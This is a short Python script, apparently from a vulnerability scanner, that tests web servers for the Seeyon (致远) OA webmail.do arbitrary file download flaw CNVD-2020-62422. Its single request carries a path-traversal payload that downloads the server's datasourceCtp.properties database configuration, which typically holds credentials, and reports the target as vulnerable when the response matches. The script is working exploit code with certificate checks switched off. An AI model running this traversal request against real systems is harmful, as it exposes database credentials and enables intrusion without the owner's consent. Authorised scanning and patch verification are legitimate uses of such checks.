#!/usr/bin/env python
# coding=utf-8
# 致远OAwebmail.do任意文件下载CNVD-2020-62422
import requests, threading
from termcolor import colored

requests.packages.urllib3.disable_warnings()  # 忽略证书报错

results = ''


def pscan_vuln(url):
    urls = url
    global results
    try:
        response = requests.get(url=url + '/seeyon/webmail.do?method=doDownloadAtt&filename=PeiQi.txt&filePath=../conf/datasourceCtp.properties', verify=False, timeout=20)
        bm = response.encoding  # 获取网页编码
        response.encoding = str(bm)  # 设置网页编码
        if "workflow" in response.text:
            print(colored('[+]存在致远OAwebmail.do任意文件下载CNVD-2020-62422', 'red'))
            results = f'{urls}-->存在致远OAwebmail.do任意文件下载CNVD-2020-62422'
        else:
            print('[-]不存在致远OAwebmail.do任意文件下载CNVD-2020-62422')
    except:
        print('[-]不存在致远OAwebmail.do任意文件下载CNVD-2020-62422')


def zhiyuanOAuoloadfile(urls):
    threads = []
    t = threading.Thread(target=pscan_vuln, args=(str(urls),))
    threads.append(t)
    t.start()
    for t in threads:
        t.join()
    return results
